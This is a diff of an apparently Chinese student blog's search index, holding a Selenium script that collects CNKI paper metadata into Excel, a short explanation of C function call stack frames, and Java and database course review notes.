class="comment">#将窗口最大化，不然好像有点问题</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># 设置网址</span></span><br><span class="line">url=<span class="string">&quot;https://kns.cnki.net/kns/advsearch?dbcode=SCDB&quot;</span></span><br><span class="line"><span class="comment"># 连接上网址</span></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 至此就成功打开了浏览器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;已成功打开浏览器，url为：&#x27;</span>,url)</span><br></pre></td></tr></table></figure>
-<p>随后就是根据不同的网页来找搜索框，输入内容，搜索</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入内容到文献来源框</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;magazine_value1&quot;]&#x27;&#x27;&#x27;</span>))).send_keys(source)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功输入来源:&quot;</span>,source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&quot;/html/body/div[2]/div[3]/div[3]/div[2]/div[1]/div[9]&quot;</span>))).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得网页内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_item</span>(<span class="params">num,col=<span class="number">1</span></span>):</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        index%=<span class="number">20</span></span><br><span class="line">        title_XPATH = <span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[2]/a&#x27;</span><span class="comment">#题名</span></span><br><span class="line">        author_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[3]&#x27;</span><span class="comment">#作者</span></span><br><span class="line">        source_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[4]&#x27;</span><span class="comment">#来源</span></span><br><span class="line">        time_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[5]&#x27;</span><span class="comment">#发布时间</span></span><br><span class="line">        database_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[6]&#x27;</span><span class="comment">#数据库</span></span><br><span class="line">        refer_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[7]&#x27;</span><span class="comment">#被引</span></span><br><span class="line">        download_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[8]&#x27;</span><span class="comment">#下载</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这样模拟就成功了，但是这里还有个问题，就是来源搜索框中有自动补全，在主题中输入内容之后自动补全触发，这个时候就定为不到网页的内容了，而来源输入又没有这个问题。因此这个脚本只能往来源中输入内容，不能往主题中输入内容，如果知道怎么解决的请cue我一下（</p>
-<p>最后附上整个脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.desired_capabilities <span class="keyword">import</span> DesiredCapabilities</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">desired_capabilities = DesiredCapabilities.CHROME</span><br><span class="line">desired_capabilities[<span class="string">&quot;pageLoadStrategy&quot;</span>] = <span class="string">&quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置谷歌驱动器的环境</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 设置chrome不加载图片，提高速度</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, &#123;<span class="string">&quot;profile.managed_default_content_settings.images&quot;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-autocomplete&quot;</span>)</span><br><span class="line"><span class="comment"># # 设置不显示窗口</span></span><br><span class="line"><span class="comment">#options.add_argument(&#x27;--headless&#x27;)</span></span><br><span class="line"><span class="comment"># 创建一个谷歌驱动器</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line"><span class="comment"># 设置搜索来源和主题</span></span><br><span class="line">source = <span class="string">&quot;经济&quot;</span></span><br><span class="line">theme = <span class="string">&quot;导购&quot;</span></span><br><span class="line"><span class="comment"># 设置所需篇数</span></span><br><span class="line">papers_need = <span class="number">100</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line"><span class="comment"># 设置网址</span></span><br><span class="line">url=<span class="string">&quot;https://kns.cnki.net/kns/advsearch?dbcode=SCDB&quot;</span></span><br><span class="line"><span class="comment"># 连接上网址</span></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;已成功打开浏览器，url为：&#x27;</span>,url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开一个excel实例</span></span><br><span class="line">workbook=xlwt.Workbook()</span><br><span class="line">sheet=workbook.add_sheet(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;题名&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;作者&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;来源&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;发表时间&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;数据库&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">5</span>,<span class="string">&#x27;被引&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">6</span>,<span class="string">&#x27;下载&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>,<span class="number">7</span>,<span class="string">&#x27;链接&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入内容到文献来源框</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;magazine_value1&quot;]&#x27;&#x27;&#x27;</span>))).send_keys(source)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功输入来源:&quot;</span>,source)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&quot;/html/body/div[2]/div[3]/div[3]/div[2]/div[1]/div[9]&quot;</span>))).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功确认检索，得到内容.....&quot;</span>)</span><br><span class="line"><span class="comment">#获得网页内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_item</span>(<span class="params">num,col=<span class="number">1</span></span>):</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        index%=<span class="number">20</span></span><br><span class="line">        title_XPATH = <span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[2]/a&#x27;</span><span class="comment">#题名</span></span><br><span class="line">        author_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[3]&#x27;</span><span class="comment">#作者</span></span><br><span class="line">        source_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[4]&#x27;</span><span class="comment">#来源</span></span><br><span class="line">        time_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[5]&#x27;</span><span class="comment">#发布时间</span></span><br><span class="line">        database_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[6]&#x27;</span><span class="comment">#数据库</span></span><br><span class="line">        refer_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[7]&#x27;</span><span class="comment">#被引</span></span><br><span class="line">        download_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[8]&#x27;</span><span class="comment">#下载</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            title = driver.find_element(By.XPATH, title_XPATH).text</span><br><span class="line">            author=driver.find_element(By.XPATH,author_XPATH).text</span><br><span class="line">            source = driver.find_element(By.XPATH, source_XPATH).text</span><br><span class="line">            times = driver.find_element(By.XPATH, time_XPATH).text</span><br><span class="line">            database = driver.find_element(By.XPATH, database_XPATH).text</span><br><span class="line">            refer = driver.find_element(By.XPATH, refer_XPATH).text</span><br><span class="line">            download = driver.find_element(By.XPATH, download_XPATH).text</span><br><span class="line">            link=driver.find_element(By.XPATH, title_XPATH).get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(title,<span class="string">&quot;\t&quot;</span>,author,source,times,database,refer,download)</span><br><span class="line">            <span class="keyword">if</span> col&lt;num:<span class="comment">#写入到excel中</span></span><br><span class="line">                sheet.write(col, <span class="number">0</span>, title)</span><br><span class="line">                sheet.write(col, <span class="number">1</span>, author)</span><br><span class="line">                sheet.write(col, <span class="number">2</span>, source)</span><br><span class="line">                sheet.write(col, <span class="number">3</span>, times)</span><br><span class="line">                sheet.write(col, <span class="number">4</span>, database)</span><br><span class="line">                sheet.write(col, <span class="number">5</span>, refer)</span><br><span class="line">                sheet.write(col, <span class="number">6</span>, download)</span><br><span class="line">                sheet.write(col, <span class="number">7</span>, link)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;所有爬取已经结束&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            col+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前页爬取结束&quot;</span>)</span><br><span class="line">            index+=<span class="number">1</span></span><br><span class="line">            <span class="comment"># 进入下一页</span></span><br><span class="line">            WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">                EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;PageNext&quot;]&#x27;&#x27;&#x27;</span>))).click()</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在爬取内容.....&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">get_item(papers_need)</span><br><span class="line"></span><br><span class="line">workbook.save(<span class="string">&#x27;output.xls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;爬取结果已储存在文件output.xls中&quot;</span>)</span><br><span class="line"></span><br><span class="line">driver.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>乱七八糟玩意</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>函数调用栈</title>
-    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
-    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
-<span id="more"></span>
-<h4 id="函数开始">函数开始</h4>
-<p>如图：</p>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
-<h4 id="函数结束">函数结束</h4>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
-]]></content>
-      <categories>
-        <category>计算机偏底层知识</category>
-      </categories>
-      <tags>
-        <tag>c语言</tag>
-        <tag>函数与栈</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基础算法01</title>
     <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
     <content><![CDATA[<p>这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
@@ -969,8 +976,8 @@
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -994,8 +1001,8 @@
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -1098,9 +1105,315 @@
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>函数调用栈</title>
+    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
+    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
+<span id="more"></span>
+<h4 id="函数开始">函数开始</h4>
+<p>如图：</p>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
+<h4 id="函数结束">函数结束</h4>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
+]]></content>
+      <categories>
+        <category>计算机偏底层知识</category>
+      </categories>
+      <tags>
+        <tag>c语言</tag>
+        <tag>函数与栈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>大二上java程序设计期末复习</title>
+    <url>/2022/11/29/%E5%A4%A7%E4%BA%8C%E4%B8%8AJava%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p>整理了一下ppt的内容，java程序设计课程的课件。</p>
+<h1>软件开发(Software Development)</h1>
+<h2 id="Agile-Methodologies（敏捷方法）">Agile Methodologies（敏捷方法）</h2>
+<p>这是一种快速部署应用程序的理念，优点包括：</p>
+<ul>
+<li>
+<p>persistent software delivery 持续提交软件</p>
+</li>
+<li>
+<p>increased stakeholder satisfaction 增加利益方的满意度</p>
+</li>
+<li>
+<p>inspect and adapt 检查调整</p>
+</li>
+<li>
+<p>welcome to changes at any stage 支持任意阶段修改</p>
+</li>
+<li>
+<p>design is important 设计至关重要</p>
+</li>
+<li>
+<p>daily interaction 日常互动</p>
+</li>
+</ul>
+<h2 id="版本控制（version-control）">版本控制（version control）</h2>
+<p>就是说需要一个git来控制一下版本，对多人合作很方便。而关于这个git的用法可以看看<a href="https://zthlly.github.io/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">这篇博客</a> 。</p>
+<h2 id="JVM">JVM</h2>
+<p>这里多说两句这个JVM，JVM（Java Virtucal Machine）是一个类似虚拟机的玩意，它运行在操作系统之下，通过与操作系统交互达到与硬件交互的目的。知道这个之后我们看看java文件怎么运行，首先写完一个.java文件之后通过编译器编译得到一个.class文件，然后通过类加载器把这个.class丢到JVM里面。这里再多提两句嘴，JVM内主要的五大块：方法区，堆是线程共享区域，有线程安全问题，栈和本地方法栈和计数器是独享区域，不存在线程安全问题。</p>
+<h1>Java语言基础</h1>
+<h2 id="语言基础语法">语言基础语法</h2>
+<p>这个去<a href="https://zthlly.github.io/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="si1v3r的狗窝捏">这里</a>看。</p>
+<h2 id="UML图">UML图</h2>
+<p>呃就是一个类的图形化表示，举个例子吧~</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/11/29/b41b30ebbe997a4f.png" alt=""></p>
+<h2 id="递归">递归</h2>
+<ul>
+<li>Mistakes like omitting the base case or writing the recursion step incorrectly can cause infinite recursion. <strong>小心无限递归爆栈</strong></li>
+<li>Recursive programs may result in exponential method calls <strong>递归可能导致指数级别调用</strong></li>
+<li>Each recursive method can be re-written using loops<strong>所有递归可重写为循环</strong></li>
+<li>Use recursive methods only if the problem is naturally recursive (i.e., to improve understanding) or there are performance benefits, or you need to impress in a job interview<strong>在必要的时候再用递归</strong></li>
+</ul>
+<h2 id="Concurrency-in-Java-（并发）">Concurrency in Java （并发）</h2>
+<p>Complex applications may use multithreading to speed up performance or user experience  <strong>复杂的程序会使用多线程来加速性能或用户体验</strong></p>
+<h3 id="Caveats-of-multithreading（多线程注意事项）">Caveats of multithreading（多线程注意事项）</h3>
+<ul>
+<li>Calling methods from multiple threads may have undesired and unexpected side effects (things may not happen in the expected order)   <strong>可能有副作用</strong></li>
+<li>Only primitive variables that are declared <strong>final</strong> can be shared across threads  <strong>只有声明final的变量可以跨线程共享</strong></li>
+<li>Using keyword <strong>synchronized</strong> will “lock” the method execution and force other threads to wait until the execution completes <strong>使用关键字同步将“锁定”方法的执行，并强制其他线程等待，直到执行完成</strong></li>
+<li>Thread can be in different states. After termination, thread can’t be started again (however, you can create a new thread). <strong>线程终止后不能再次启动，但是可以创建一个新的线程</strong></li>
+</ul>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/084e6b23e9a89d42.png" alt=""></p>
+<h2 id="Exception-handling-（异常处理）">Exception handling  （异常处理）</h2>
+<ul>
+<li>An <em>exception</em> is an event, which occurs during the execution of a program, that disrupts the normal flow of the program’s instructions</li>
+<li><strong>Exception handler</strong> is a block of code that can handle the exception</li>
+<li>Java allows to separate exception handling code from the normal code to improve the readability</li>
+<li>Exceptions are propagated across the call stack until exception handler is found so developer can choose at which level exceptions should be handled</li>
+<li>Each organisation will have its own house style on how to write and handle exceptions</li>
+</ul>
+<p>主要层次结构如下：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/aab3b03140ebf50d.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>大二课程</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>复习</tag>
+        <tag>校内课程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据库学习</title>
+    <url>/2023/05/21/%E5%A4%A7%E4%BA%8C%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="Week1">Week1</h2>
+<h3 id="four-main-types-of-actions-involve-databases">four main types of actions involve databases</h3>
+<ul>
+<li><strong>Defining a database</strong>: It includes the data types, structures, and constraints of the data have to store in the database. The database descriptive information is also stored by the DBMS in the form of a database catalog or dictionary; it is called meta-data.</li>
+<li><strong>Constructing the database</strong>: It is the process of data storing on some storage medium that is maintained by the DBMS.</li>
+<li><strong>Manipulating a database</strong>: It includes functions such as retrieve the database by using query, updating the database to reflect changes in the system, and generate reports from the data.</li>
+<li><strong>Sharing a database</strong>: It allows multiple users and programs to access the database simultaneously.</li>
+</ul>
+<h3 id="four-main-characteristics-of-the-database-approach-（四个数据库方法的主要特征）">four main characteristics of the database approach. （四个数据库方法的主要特征）</h3>
+<ul>
+<li>self-describing nature of a database system（自描述性质）</li>
+<li>insulation between programs and data（程序和数据间的隔离）</li>
+<li>data abstraction（数据抽象）</li>
+<li>support of multiple views of the data. （支持数据的多个视图）</li>
+</ul>
+<h3 id="The-differences-between-controlled-and-uncontrolled-redundancy（受控冗余和不受控冗余）">The differences between controlled and uncontrolled redundancy（受控冗余和不受控冗余）</h3>
+<p>Redundancy is the state of being not or no longer needed or useful. Uncontrolled redundancy in storing the same data or information many times in the database leads to several problems including duplication of effort, wastage of storage space and inconsistent data. Controlled redundancy is a technique to use redundant fields in a database. This speed up the database access and also improves the performance of queries. Usually, the DBMS ensures the allocation of the data in the records. It should have the capability to control this redundancy in order to prohibit inconsistencies among the files.</p>
+<h2 id="Week2">Week2</h2>
+<h3 id="differences-between-a-database-schema-and-a-database-state-（数据库模式和数据库状态的区别）">differences between a database schema and a database state. （数据库模式和数据库状态的区别）</h3>
+<p>A database schema represents the overall design of the database. In contrast, the database state represents the current state of data in the database. The database schema is changed occasionally. The database state is changed frequently. Initially when defining a database, only thedatabase schema is specified. The database state is the empty state when the database is defined.</p>
+<p><strong>answer:</strong></p>
+<ul>
+<li>A database schema represents the overall design of the database. In contrast, the database state represents the current state of data in the database.</li>
+<li>The database schema is changed occasionally. In contrast, the database state is changed frequently.</li>
+<li>Initially when defining a database, only the database schema is specified. The database state is the empty state when the database is defined.</li>
+</ul>
+<h3 id="differences-between-logical-data-independence-and-physical-data-independence-（逻辑数据独立性和物理数据独立性区别）">differences between logical data independence and physical data independence. （逻辑数据独立性和物理数据独立性区别）</h3>
+<p>Logical data independence is mainly concerned about the structure or the changing data definition. In contrast, physical data independence is mainly concerned about how the data is stored on the system. Any changes made at the logical level require a change at the application level. In contrast, any changes made at the physical level need not be made at the application level. The conceptual schema is the primary concern in achieving logical data independence. In contrast, the internal schema is the primary concern in achieving physical data independence. Achieving physical data independence is much easier as compared to logical data independence. In contrast, achieving logical data independence is more difficult as compared to physical data independence.</p>
+<h3 id="Why-logical-data-independence-is-harder-to-achieve-compared-to-physical-data-independence">Why logical data independence is harder to achieve compared to physical data independence?</h3>
+<p>Logical data independence is harder to achieve as the application programs are heavily dependent on the logical format of the data they access. Hence, a change at the conceptual level might require changing the entire program application. When it comes to physical data independence, a change in the location of the database or modifying the file organisation or use of new storage devices will not require change at the higher logical levels.</p>
+<p><strong>Answer:</strong></p>
+<ul>
+<li>Logical data independence is harder to achieve as the application programs are heavily dependent on the logical format of the data they access</li>
+<li>Hence, a change at the conceptual level might require changing the entire program application.</li>
+<li>When it comes to physical data independence, a change in the location of the database or modifying the file organisation or use of new storage devices will not require change at the higher logical levels.</li>
+</ul>
+<h3 id="procedural-and-non-procedural-data-manipulation-languages-（程序性数据操作语言和非程序性操作语言）">procedural and non-procedural data manipulation languages.（程序性数据操作语言和非程序性操作语言）</h3>
+<ul>
+<li>In terms of the mode of operation of a procedural DML, a programmer needs to provide a sequential set of instructions regarding what the system needs to perform and how it needs to perform them In contrast, a programmer only needs to provide the information regarding what the system need to d and not how to do it when using a non-procedural DML.</li>
+<li>In terms of language driving, a procedural DML is a command-driven kind of programming language. In contrast, a non-procedural DML is a function-kind of programming language.</li>
+<li>In terms of the approach, a procedural DML is mainly aimed at solving a particular set of available problems. In contrast, a non-procedural DML is a domain-specific type of language.</li>
+<li>In terms of dependency, a procedural DML mainly depends on the execution order. In contrast, a non procedural DML mainly depends on the parameter’s values from the given function.</li>
+<li>In terms of writing of language, a procedural DML is written in the form of a set of the required instructions. In contrast, a non-procedural DML is written in the form of natural instructions of a language.</li>
+</ul>
+<h2 id="Week3">Week3</h2>
+<h3 id="two-cases-where-use-of-a-NULL-value-would-be-appropriate">two cases where use of a NULL value would be appropriate.</h3>
+<p>Setting a NULL value is appropriate when the actual value is <strong>unknown</strong>, or when <strong>a value would not be meaningful</strong>.</p>
+<h3 id="the-differences-among-an-entity-an-entity-type-and-an-entity-set-（实体，实体类型，实体集合）">the differences among an entity, an entity type, and an entity set. （实体，实体类型，实体集合）</h3>
+<p>An entity is a thing in the real world with independent existence. An entity type is a category of a particular entity. An entity set is the set of all entities of a particular entity type.</p>
+<h3 id="differences-between-an-attribute-and-a-value-set-属性和值集的区别">differences between an attribute and a value set (属性和值集的区别)</h3>
+<p>Attributes describe the instances in the row of a database. For example, attributes in an invoice can be price, invoice number and date. A value set specifies the set of values that may be assigned to that attribute for each individual entity.</p>
+<h3 id="two-conditions-where-an-attribute-of-a-binary-relationship-type-can-be-migrated-to-become-an-attribute-of-one-of-the-participating-entity-types">two conditions where an attribute of a binary relationship type can be migrated to become an attribute of one of the participating entity types.</h3>
+<p>The attributes of 1:1 or 1:N relationship types can be migrated to one of the participating entity types. In case of 1:1 cardinality, attributes can be moved to either of entity types in binary relationship. In case of 1:N cardinality, attributes can be migrated only to N side of relationship. In both 1:1 and I:N relationship types, the decision as to where a relationship attribute should be placed – as a relationship type attribute or as an attribute of a participating entity type – is determined subjectively by the schema designer. For relationship types with cardinality M:N, attributes cannot be migrated to become attributes of one of participating entity types.</p>
+<h3 id="two-examples-of-recursive-relationship-types-（递归关系类型）">two examples of recursive relationship types.（递归关系类型）</h3>
+<p>The first example of a recursive relationship type is the supervisor employee relationship. An employee can supervise multiple employees. Hence, it is a recursive relationship of entity EMPLOYEE with itself. This is a one-to-many recursive relationship as one employee supervises many employees. The second example of a recursive relationship type is the class leader and students. A student can be a class leader and handle other students but a person who is working as a class leader is itself a student of the class. Hence, a class leader has a recursive relationship of entity STUDENT with itself.</p>
+<h2 id="Week16">Week16</h2>
+<h3 id="SQL">SQL</h3>
+<p>SQL is a very large and powerful language, but every type of SQL statement falls withinone of three main categories (or sub-languages):</p>
+<p>• <strong>Data Definition Language</strong> (DDL) for creating a DB<br>
+CREATE , DROP , ALTER</p>
+<p>• <strong>Data Control Language</strong> (DCL) for administering a DB<br>
+GRANT , DENY , USE</p>
+<p>• <strong>Data Manipulation Language</strong> (DML) to access a DB<br>
+SELECT , INSERT , UPDATE , DELETE</p>
